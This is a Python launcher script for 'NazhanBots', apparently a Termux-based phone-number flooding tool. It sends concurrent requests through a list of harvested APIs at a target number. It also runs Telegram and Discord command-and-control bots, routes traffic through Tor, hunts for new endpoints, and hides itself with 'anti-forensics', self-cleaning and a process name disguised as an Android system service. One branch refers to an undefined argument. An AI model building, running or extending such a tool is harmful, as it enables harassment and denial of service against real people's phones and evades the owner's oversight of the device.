# termux_version/main.py
import sys
import os
import argparse
import asyncio
import json
import time

# v17000: ANTI-FORENSICS (No Bytecode)
sys.dont_write_bytecode = True

# Ensure we can import from core/
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# v43 Integrations
from core.utils import autoketik
from core.attacker import start_async_attack 
from core.telegram_c2 import start_bot
from core.cleaner import self_clean
from core.health_check import check_api_health

def load_apis():
    path = os.path.join(os.path.dirname(__file__), 'config/apis.json')
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except:
        return []

def manual_attack(number):
    print(f"🚀 Manual Attack Mode: {number}")
    apis = load_apis()
    if not apis:
        print("❌ No APIs found in config/apis.json")
        return
        
    try:
        # Run async loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(start_async_attack(apis, number, duration=60))
        loop.close()
    except KeyboardInterrupt:
        print("\n🛑 Attack Stopped")

def main():
    parser = argparse.ArgumentParser(description="NazhanBots v1000 [GOD MODE]")
    parser.add_argument("number", nargs="?", help="Target Phone Number")
    parser.add_argument("--child", action="store_true", help="Run as child process (internal)")
    parser.add_argument("--hunter", action="store_true", help="Start API Hunter Mode")
    parser.add_argument("--guardian", action="store_true", help="Start Guardian Mode")
    parser.add_argument("--tor", action="store_true", help="Route traffic via Tor Network")
    parser.add_argument("--lite", action="store_true", help="Run in Lightweight Mode (No UI/Voice/Discord) for Max Speed")
    args = parser.parse_args()

    # vOptimization: Lite Mode Global Setting
    if args.lite:
        print("⚡ [LITE MODE] Visuals, Voice, and Remote C2 Disabled for Maximum Performance.")
        os.environ["NAZHAN_LITE"] = "1"
    else:
        # v11000: Launch Web Dashboard (Only in Full Mode)
        try:
            from core.dashboard import launch_dashboard
            launch_dashboard()
        except Exception as e:
            print(f"⚠️ Dashboard Init Failed: {e}")

    # v11000: Hive Sync (Always run, lightweight)
    try:
        from core.hive import sync_hive
        import threading
        t = threading.Thread(target=sync_hive)
        t.daemon = True
        t.start()
    except: pass
    
    # v51: CYBERPUNK CLI (Rich) - SKIP IF LITE
    if not args.lite:
        try:
            from rich.console import Console
            from rich.panel import Panel
            from rich.table import Table
            from rich.align import Align
            from rich import box
            
            console = Console()
            
            # Banner
            title = """
      _   _           _                 ____        _       
     | \ | | __ _ ___| |__   __ _ _ __ | __ )  ___ | |_ ___ 
     |  \| |/ _` |_  / '_ \ / _` | '_ \|  _ \ / _ \| __/ __|
     | |\  | (_| |/ /| | | | (_| | | | | |_) | (_) | |_\__ \\
     |_| \_|\__,_/___|_| |_|\__,_|_| |_|____/ \___/ \__|___/
                  v1000 [GOD MODE]
            """
            
            # Stats Table
            table = Table(show_header=False, box=box.SIMPLE)
            table.add_column("Key", style="cyan")
            table.add_column("Value", style="green")
            table.add_row("System", "Online")
            table.add_row("Mode", "Termux Native")
            table.add_row("Modules", "Doctor, Guardian, Hive")
            
            panel = Panel(
                Align.center(
                    f"[bold green]{title}[/bold green]\n\n" + 
                    "[bold white]NazhanBots System[/bold white]\n" +
                    "[italic grey50]Ultimate Termux Server[/italic grey50]"
                ),
                border_style="green",
                title="[bold yellow]SYSTEM INITIALIZED[/bold yellow]",
                subtitle="[blink red]UNAUTHORIZED ACCESS PROHIBITED[/blink red]"
            )
            
            console.print(panel)
            console.print(table)
            
        except ImportError:
            autoketik("🔥 Project Superior v999 (Fallback Mode) Loaded.")
    else:
        print("🔥 NazhanBots LITE MODE Active. Ready to Fire.")

    # v999: OMEGA DIAGNOSTICS
    from core.doctor import diagnose
    diagnose()

    # v40 Startup Routine
    self_clean()
    asyncio.run(check_api_health())
    
    if args.hunter:
        from core.hunter import search_new_apis
        search_new_apis()
    elif args.number:
        # Pass lite flag to attacker via env or arg? 
        # Attacker function signature doesn't take lite, but we can set concurrency higher
        concurrency = 100 if args.lite else 50
        print(f"🚀 Manual Attack Mode: {args.number} (Concurrency: {concurrency})")
        
        apis = load_apis()
        if not apis:
            print("❌ No APIs found.")
            return

        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(start_async_attack(apis, args.number, duration=60, concurrency=concurrency))
            loop.close()
        except KeyboardInterrupt:
            print("\n🛑 Attack Stopped")
            
    elif args.cli:
         num = input("Target: ")
         concurrency = 100 if args.lite else 50
         print(f"🚀 Manual Attack Mode: {num}")
         apis = load_apis()
         try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(start_async_attack(apis, num, duration=60, concurrency=concurrency))
            loop.close()
         except: pass

    else:
        # v55 SERVER MODE: Multi-C2
        
        # If LITE, Skip Discord and Voice
        if not args.lite:
            print("🤖 Starting C2 Servers (Telegram & Discord)...")
        else:
            print("🤖 Starting C2 Servers (Telegram Only)...")
            
        # Run Telegram in a separate thread because it uses blocking polling
        import threading
        from core.telegram_c2 import start_bot as start_tg
        
        tg_thread = threading.Thread(target=start_tg)
        tg_thread.daemon = True 
        tg_thread.start()
        
        # v60: SINGULARITY (AI Brain)
        from core.brain import start_brain
        start_brain()
        
        # v110: INFINITY (Hive Sync)
        from core.syncer import sync_from_hive
        try: sync_from_hive()
        except: pass
        
        if not args.lite:
            # v110: Dashboard Generator
            from core.web_reporter_lite import generate_static_dashboard
            generate_static_dashboard()
            
            # Start Discord
            from core.discord_c2 import start_discord_bot
            start_discord_bot()
            
            try:
                tg_thread.join()
            except KeyboardInterrupt:
                print("🛑 Server Shutdown.")
        else:
            # LITE LOOP
            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print("🛑 Server Shutdown.")

# v9000: GHOST PROCESS MASKING
try:
    import setproctitle
    setproctitle.setproctitle("com.android.sys.service")
except ImportError:
    pass # In setup.sh we can do exec -a trick

# v90: Watchdog Integration
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--child":
        pass # It's a worker
    else:
        # Masquerade in logs
        pass
    # 9. Scheduler
    try:
        from core.scheduler import start_scheduler
        start_scheduler()
    except ImportError: pass

    # 10. SKYNET (Autonomous Life Cycle) v25000
    try:
        from core.skynet import activate_skynet
        activate_skynet()
        print("🌌 [SKYNET] Awaiting Singularity...")
    except Exception as e: 
        print(f"⚠️ Skynet Fail: {e}")
    
    # 11. Keep Alive
    try:
        # v29000: Voice Announce
        try:
            from core.voice import announce_startup
            announce_startup()
        except: pass
        
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 [SYSTEM] User Interrupted. Shutting Down.")
        try:
            sys.exit(0)
        except:
            os._exit(0)

